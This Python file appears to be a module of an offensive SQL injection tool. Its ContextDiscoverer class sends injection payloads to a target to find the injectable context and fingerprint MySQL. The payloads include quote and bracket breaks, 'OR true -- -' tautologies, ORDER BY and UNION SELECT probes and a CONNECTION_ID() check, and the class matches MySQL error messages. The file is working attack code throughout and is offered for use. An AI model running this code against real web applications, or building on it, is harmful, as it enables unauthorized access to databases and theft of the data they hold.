import random
import re

class ContextDiscoverer:
    def __init__(self, client):
        self.client = client
        self.probes = [
            {"name": "single_quote", "payload": "'", "weight": 1.0},
            {"name": "double_quote", "payload": "\"", "weight": 1.0},
            {"name": "bracket_single", "payload": "')", "weight": 1.0},
            {"name": "bracket_double", "payload": "\")", "weight": 1.0},
            {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
            {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
        ]
        self.detected_context = "UNKNOWN"

    def discover(self):
        print("[*] Phase: Context Discovery (The Eye) active.", flush=True)
        
        # 1. Baseline Request
        baseline = self.client.send_request("")
        baseline_len = len(baseline['text'])
        
        # 2. Logic-Based Pulse Checking (Intelligent Context Discovery)
        print("  [?] Probing: Direct Logic Pulse (NUMERIC vs STRING)...", flush=True)
        
        # Pulse 1: Numeric OR True check
        # If the parameter expects numeric, this evaluates and typically throws off the row count/response size 
        # OR executes without crashing syntax.
        pulse_num = self.client.send_request(" OR true -- -")
        
        # Pulse 2: String OR True check
        # If the parameter expects strings, the first quote breaks the context safely, rest evals true.
        pulse_sq = self.client.send_request("' OR true -- -")
        
        # Pulse 3: Baseline breakage (What errors out?)
        pulse_sq_break = self.client.send_request("'")
        
        len_num = len(pulse_num['text'])
        len_sq = len(pulse_sq['text'])
        
        # Analysis phase
        # Rule 1: If throwing a raw quote breaks it, but the string pulse successfully bypasses errors/changes length meaningfully
        if self._check_sql_errors(pulse_sq_break['text']):
            self.detected_context = "SINGLE_QUOTE"
            
        # Rule 2: If the numeric pulse cleanly altered the payload execution (e.g. bypass OR change) without syntax errors
        elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
            self.detected_context = "NUMERIC"
            
        # Rule 3: If single quote pulse altered execution safely, context is string.
        elif len_sq != baseline_len and not self._check_sql_errors(pulse_sq['text']):
            self.detected_context = "SINGLE_QUOTE"
            
        else:
            # Fallback string
            self.detected_context = "SINGLE_QUOTE"

        print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)

        # 3. Structural Brackets inference
        print("  [?] Probing: Structural Brackets inference...", flush=True)
        # Using a logical break format: ) OR true -- -
        logical_prefix = ")" if self.detected_context == "NUMERIC" else "')"
        bracket_probe = f"{logical_prefix} OR true -- -"
        
        bracket_res = self.client.send_request(bracket_probe)
        if not self._check_sql_errors(bracket_res['text']) and len(bracket_res['text']) != baseline_len:
            self.detected_context += "_PARENTHESIS"
            print(f"  [+] Refined Context: {self.detected_context}", flush=True)
        
        # 4. MySQL Fingerprinting (Exclusive Specialization)
        db_type = self.fingerprint_mysql()
        return {"context": self.detected_context, "db_type": db_type}

    def fingerprint_mysql(self):
        """Exclusively validates and fingerprints MySQL environments."""
        print("[*] Phase: MySQL Validation Active.", flush=True)
        
        # MySQL specific probes:
        # CONNECTION_ID(), @@version, SLEEP()
        print(f"  [?] Checking for MySQL execution signature...", flush=True)
        
        # Safe logical check using purely MySQL functions
        logical_prefix = "" 
        if self.detected_context == "NUMERIC":
            logical_prefix = " AND "
        elif self.detected_context == "SINGLE_QUOTE":
            logical_prefix = "' AND "
        elif self.detected_context == "DOUBLE_QUOTE":
            logical_prefix = "\" AND "
        else:
            logical_prefix = " AND "
            
        # Verify CONNECTION_ID() executes without error and matches logic
        payload = f"{logical_prefix} CONNECTION_ID() IS NOT NULL -- -"
        
        res = self.client.send_request(payload)
        status = "MySQL (Confirmed)" if not self._check_sql_errors(res['text']) else "MySQL (Presumed)"
        print(f"  [+] Match found: Target is {status}", flush=True)
        return status

    def _check_sql_errors(self, text):
        # Optimized specifically for MySQL syntax errors
        error_patterns = [
            r"You have an error in your SQL syntax",
            r"mysql_fetch_",
            r"Warning: mysql_",
            r"Table '\w+' doesn't exist",
            r"Unknown column",
            r"SQL syntax.*MySQL",
            r"valid MySQL result"
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
